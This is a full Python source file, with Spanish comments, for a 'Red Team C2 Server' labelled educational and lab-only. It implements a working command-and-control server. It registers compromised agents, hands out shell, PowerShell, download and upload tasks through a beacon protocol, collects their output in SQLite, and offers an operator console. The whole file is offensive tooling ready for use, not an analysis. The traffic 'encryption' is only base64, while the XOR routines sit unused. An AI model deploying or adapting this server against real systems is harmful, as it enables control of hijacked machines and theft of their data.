#!/usr/bin/env python3
"""
Red Team C2 Server - Versión Educativa
Solo para entornos de laboratorio controlados con permiso explícito.
"""
import asyncio
import ssl
import json
import base64
import logging
import sqlite3
from datetime import datetime
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict

# ==================== CONFIGURACIÓN ====================
C2_HOST = "0.0.0.0"  # Cambiar a IP de tu laboratorio
C2_PORT = 8443
SSL_CERT = "./server.crt"
SSL_KEY = "./server.key"
DB_FILE = "./c2_database.db"

# Clave maestra del C2 (debe coincidir con la del cliente)
MASTER_KEY = "this_is_a_demo_key_change_in_production_1234567890"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("C2-Server")

@dataclass
class Agent:
    agent_id: str
    hostname: str
    username: str
    ip_address: str
    os_version: str
    architecture: str
    integrity: str
    last_seen: str
    first_seen: str
    status: str = "active"

class C2Database:
    def __init__(self, db_path: str):
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        
        # Tabla de agentes
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                agent_id TEXT PRIMARY KEY,
                hostname TEXT,
                username TEXT,
                ip_address TEXT,
                os_version TEXT,
                architecture TEXT,
                integrity TEXT,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT
            )
        ''')
        
        # Tabla de tareas
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                task_id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                command TEXT,
                arguments TEXT,
                status TEXT DEFAULT 'pending',
                created_at TEXT,
                completed_at TEXT,
                result TEXT,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        # Tabla de resultados
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS results (
                result_id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                task_id INTEGER,
                data TEXT,
                received_at TEXT,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id),
                FOREIGN KEY (task_id) REFERENCES tasks (task_id)
            )
        ''')
        
        self.conn.commit()
    
    def register_agent(self, agent_data: Dict):
        cursor = self.conn.cursor()
        now = datetime.now().isoformat()
        
        cursor.execute('''
            INSERT OR REPLACE INTO agents 
            (agent_id, hostname, username, ip_address, os_version, 
             architecture, integrity, first_seen, last_seen, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            agent_data['agent_id'],
            agent_data.get('hostname', 'unknown'),
            agent_data.get('username', 'unknown'),
            agent_data.get('ip_address', 'unknown'),
            agent_data.get('os_version', 'unknown'),
            agent_data.get('architecture', 'unknown'),
            agent_data.get('integrity', 'medium'),
            now,
            now,
            'active'
        ))
        
        self.conn.commit()
        logger.info(f"Agent registered: {agent_data['agent_id']}")
    
    def update_agent_heartbeat(self, agent_id: str):
        cursor = self.conn.cursor()
        cursor.execute(
            "UPDATE agents SET last_seen = ? WHERE agent_id = ?",
            (datetime.now().isoformat(), agent_id)
        )
        self.conn.commit()
    
    def create_task(self, agent_id: str, command: str, arguments: str = ""):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO tasks (agent_id, command, arguments, created_at)
            VALUES (?, ?, ?, ?)
        ''', (agent_id, command, arguments, datetime.now().isoformat()))
        
        self.conn.commit()
        return cursor.lastrowid
    
    def get_pending_tasks(self, agent_id: str) -> List[Dict]:
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT task_id, command, arguments FROM tasks 
            WHERE agent_id = ? AND status = 'pending'
        ''', (agent_id,))
        
        tasks = []
        for row in cursor.fetchall():
            tasks.append({
                'task_id': row[0],
                'command': row[1],
                'arguments': row[2]
            })
        
        return tasks
    
    def update_task_status(self, task_id: int, status: str, result: str = ""):
        cursor = self.conn.cursor()
        cursor.execute('''
            UPDATE tasks SET status = ?, completed_at = ?, result = ?
            WHERE task_id = ?
        ''', (status, datetime.now().isoformat(), result, task_id))
        
        self.conn.commit()
    
    def save_result(self, agent_id: str, task_id: int, data: str):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO results (agent_id, task_id, data, received_at)
            VALUES (?, ?, ?, ?)
        ''', (agent_id, task_id, data, datetime.now().isoformat()))
        
        self.conn.commit()

class CryptoHandler:
    @staticmethod
    def xor_encrypt(data: str, key: str) -> str:
        """Cifrado XOR simple (solo para demo)"""
        encrypted = []
        for i, char in enumerate(data):
            key_char = key[i % len(key)]
            encrypted.append(chr(ord(char) ^ ord(key_char)))
        return ''.join(encrypted)
    
    @staticmethod
    def xor_decrypt(encrypted: str, key: str) -> str:
        """Descifrado XOR (simétrico)"""
        return CryptoHandler.xor_encrypt(encrypted, key)
    
    @staticmethod
    def encode_base64(data: str) -> str:
        return base64.b64encode(data.encode()).decode()
    
    @staticmethod
    def decode_base64(data: str) -> str:
        return base64.b64decode(data).decode()

class C2ServerProtocol:
    def __init__(self, database: C2Database):
        self.db = database
        self.crypto = CryptoHandler()
    
    async def handle_beacon(self, request_data: Dict) -> Dict:
        """Procesa un beacon del agente"""
        try:
            agent_id = request_data.get('agent_id')
            ip_address = request_data.get('ip_address', 'unknown')
            
            if not agent_id:
                return {"status": "error", "message": "No agent ID"}
            
            # Registrar/actualizar agente
            agent_data = {
                'agent_id': agent_id,
                'hostname': request_data.get('hostname', 'unknown'),
                'username': request_data.get('username', 'unknown'),
                'ip_address': ip_address,
                'os_version': request_data.get('os_version', 'unknown'),
                'architecture': request_data.get('architecture', 'unknown'),
                'integrity': request_data.get('integrity', 'medium')
            }
            
            self.db.register_agent(agent_data)
            
            # Obtener tareas pendientes para este agente
            tasks = self.db.get_pending_tasks(agent_id)
            
            # Preparar respuesta
            response = {
                'status': 'success',
                'agent_id': agent_id,
                'tasks': tasks,
                'sleep_time': 30,  # Segundos hasta próximo beacon
                'jitter': 5
            }
            
            logger.info(f"Beacon from {agent_id} ({ip_address}) - {len(tasks)} tasks")
            return response
            
        except Exception as e:
            logger.error(f"Error handling beacon: {e}")
            return {"status": "error", "message": str(e)}
    
    async def handle_task_result(self, agent_id: str, task_id: int, result: str):
        """Procesa resultados de tareas ejecutadas"""
        try:
            self.db.update_task_status(task_id, 'completed', result)
            self.db.save_result(agent_id, task_id, result)
            logger.info(f"Task {task_id} completed by {agent_id}")
            return {"status": "success"}
        except Exception as e:
            logger.error(f"Error handling task result: {e}")
            return {"status": "error", "message": str(e)}
    
    async def process_request(self, raw_data: bytes, client_ip: str) -> bytes:
        """Procesa una petición HTTP"""
        try:
            # Decodificar y descifrar
            data_str = raw_data.decode('utf-8', errors='ignore')
            
            # Buscar JSON en el cuerpo
            lines = data_str.split('\r\n')
            body_start = False
            body = ""
            
            for line in lines:
                if body_start:
                    body += line
                elif line == "":
                    body_start = True
            
            if not body:
                return self._http_response(400, "No data")
            
            # Descifrar (en demo, XOR con base64)
            decrypted = self.crypto.decode_base64(body)
            request_data = json.loads(decrypted)
            
            # Determinar tipo de petición
            request_type = request_data.get('type', 'beacon')
            
            if request_type == 'beacon':
                # Beacon normal
                response_data = await self.handle_beacon(request_data)
                response_data['client_ip'] = client_ip
                
            elif request_type == 'task_result':
                # Resultado de tarea
                response_data = await self.handle_task_result(
                    request_data['agent_id'],
                    request_data['task_id'],
                    request_data['result']
                )
                
            else:
                response_data = {"status": "error", "message": "Unknown request type"}
            
            # Cifrar respuesta
            json_response = json.dumps(response_data)
            encrypted_response = self.crypto.encode_base64(json_response)
            
            return self._http_response(200, encrypted_response)
            
        except json.JSONDecodeError as e:
            logger.error(f"JSON decode error: {e}")
            return self._http_response(400, "Invalid JSON")
        except Exception as e:
            logger.error(f"Processing error: {e}")
            return self._http_response(500, "Server error")
    
    def _http_response(self, status_code: int, body: str = "") -> bytes:
        """Genera respuesta HTTP"""
        status_text = {
            200: "OK",
            400: "Bad Request",
            500: "Internal Server Error"
        }.get(status_code, "Unknown")
        
        response = f"HTTP/1.1 {status_code} {status_text}\r\n"
        response += "Content-Type: application/json\r\n"
        response += f"Content-Length: {len(body)}\r\n"
        response += "Connection: close\r\n"
        response += "\r\n"
        response += body
        
        return response.encode()

async def handle_client(reader, writer, protocol: C2ServerProtocol):
    """Manejador de cliente asíncrono"""
    client_ip = writer.get_extra_info('peername')[0]
    
    try:
        # Leer petición
        data = await reader.read(8192)
        
        if not data:
            writer.close()
            return
        
        # Procesar petición
        response = await protocol.process_request(data, client_ip)
        
        # Enviar respuesta
        writer.write(response)
        await writer.drain()
        
    except Exception as e:
        logger.error(f"Client handling error: {e}")
    finally:
        writer.close()
        await writer.wait_closed()

class C2Console:
    """Consola interactiva para el operador"""
    def __init__(self, database: C2Database):
        self.db = database
        self.running = True
    
    async def run(self):
        print("\n" + "="*60)
        print("RED TEAM C2 SERVER - CONSOLE")
        print("="*60 + "\n")
        
        while self.running:
            try:
                command = input("C2> ").strip().lower()
                
                if command == "help":
                    self.show_help()
                elif command == "agents":
                    self.list_agents()
                elif command.startswith("tasks "):
                    self.create_task(command)
                elif command.startswith("results "):
                    self.show_results(command)
                elif command == "clear":
                    print("\n" * 100)
                elif command == "exit":
                    self.running = False
                    print("Shutting down console...")
                else:
                    print(f"Unknown command: {command}")
                    
            except KeyboardInterrupt:
                print("\nInterrupted. Use 'exit' to quit.")
            except Exception as e:
                print(f"Error: {e}")
    
    def show_help(self):
        print("""
Available commands:
  agents           - List all registered agents
  tasks <agent_id> - Create task for agent
  results <task_id> - Show task results
  clear           - Clear screen
  exit            - Exit console
        """)
    
    def list_agents(self):
        cursor = self.db.conn.cursor()
        cursor.execute("SELECT * FROM agents ORDER BY last_seen DESC")
        
        agents = cursor.fetchall()
        
        if not agents:
            print("No agents registered")
            return
        
        print(f"\n{'ID':<20} {'Hostname':<15} {'User':<15} {'IP':<15} {'Last Seen':<20}")
        print("-" * 85)
        
        for agent in agents:
            agent_id = agent[0]
            hostname = agent[1][:14] + "..." if len(agent[1]) > 14 else agent[1]
            username = agent[2][:14] + "..." if len(agent[2]) > 14 else agent[2]
            ip_address = agent[3]
            last_seen = agent[8][:19]  # Formato ISO simplificado
            
            print(f"{agent_id:<20} {hostname:<15} {username:<15} {ip_address:<15} {last_seen:<20}")
        
        print()
    
    def create_task(self, command: str):
        parts = command.split()
        if len(parts) < 2:
            print("Usage: tasks <agent_id>")
            return
        
        agent_id = parts[1]
        
        print(f"\nCreating task for agent: {agent_id}")
        print("Available commands:")
        print("  cmd <command>        - Execute shell command")
        print("  psh <script>         - Execute PowerShell")
        print("  download <url> <path> - Download file")
        print("  upload <local_path>   - Upload file")
        print("  sleep <seconds>      - Sleep for seconds")
        
        task_input = input("\nCommand: ").strip()
        
        if not task_input:
            print("Cancelled")
            return
        
        task_parts = task_input.split(maxsplit=1)
        if len(task_parts) < 1:
            print("Invalid command")
            return
        
        cmd_type = task_parts[0]
        cmd_args = task_parts[1] if len(task_parts) > 1 else ""
        
        task_id = self.db.create_task(agent_id, cmd_type, cmd_args)
        print(f"Task created with ID: {task_id}")
    
    def show_results(self, command: str):
        parts = command.split()
        if len(parts) < 2:
            print("Usage: results <task_id>")
            return
        
        try:
            task_id = int(parts[1])
        except ValueError:
            print("Task ID must be a number")
            return
        
        cursor = self.db.conn.cursor()
        cursor.execute('''
            SELECT t.command, t.arguments, t.status, r.data, r.received_at
            FROM tasks t
            LEFT JOIN results r ON t.task_id = r.task_id
            WHERE t.task_id = ?
        ''', (task_id,))
        
        result = cursor.fetchone()
        
        if not result:
            print(f"No task found with ID: {task_id}")
            return
        
        command, arguments, status, data, received_at = result
        
        print(f"\nTask {task_id}:")
        print(f"  Command:   {command}")
        print(f"  Arguments: {arguments}")
        print(f"  Status:    {status}")
        print(f"  Completed: {received_at or 'Pending'}")
        
        if data:
            print(f"\nResults:\n{'-'*40}")
            print(data[:1000])  # Limitar para no saturar consola
            if len(data) > 1000:
                print(f"... (truncated, total {len(data)} bytes)")

async def main():
    """Función principal"""
    print("Starting Red Team C2 Server (Educational Version)...")
    
    # Inicializar base de datos
    db = C2Database(DB_FILE)
    protocol = C2ServerProtocol(db)
    
    # Crear contexto SSL (para HTTPS real)
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    
    # En ambiente real necesitarías certificados válidos
    # Para demo, puedes generar autofirmados con:
    # openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
    
    try:
        ssl_context.load_cert_chain(SSL_CERT, SSL_KEY)
        logger.info(f"SSL certificates loaded from {SSL_CERT}")
    except Exception as e:
        logger.warning(f"Could not load SSL certificates: {e}")
        logger.warning("Running without SSL (NOT recommended)")
        ssl_context = None
    
    # Iniciar servidor
    server = await asyncio.start_server(
        lambda r, w: handle_client(r, w, protocol),
        C2_HOST,
        C2_PORT,
        ssl=ssl_context
    )
    
    logger.info(f"C2 Server listening on {C2_HOST}:{C2_PORT}")
    
    # Iniciar consola en segundo plano
    console = C2Console(db)
    console_task = asyncio.create_task(console.run())
    
    # Mantener servidor activo
    async with server:
        try:
            await server.serve_forever()
        except asyncio.CancelledError:
            pass
        finally:
            console_task.cancel()
            await console_task

def generate_certificates():
    """Genera certificados autofirmados para pruebas"""
    import subprocess
    import os
    
    if os.path.exists(SSL_CERT) and os.path.exists(SSL_KEY):
        print("Certificates already exist")
        return
    
    print("Generating self-signed SSL certificates...")
    
    # Comando para generar certificado autofirmado
    cmd = [
        'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
        '-keyout', SSL_KEY, '-out', SSL_CERT,
        '-days', '365', '-nodes',
        '-subj', '/C=US/ST=Demo/L=Lab/O=RedTeam/CN=c2.lab.local'
    ]
    
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        print(f"Certificates generated: {SSL_CERT}, {SSL_KEY}")
    except subprocess.CalledProcessError as e:
        print(f"Error generating certificates: {e}")
        print("You need OpenSSL installed or manually create certificates")
    except FileNotFoundError:
        print("OpenSSL not found. Install it or create certificates manually")

if __name__ == "__main__":
    # Generar certificados si no existen
    generate_certificates()
    
    # Ejecutar servidor
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nServer stopped by user")
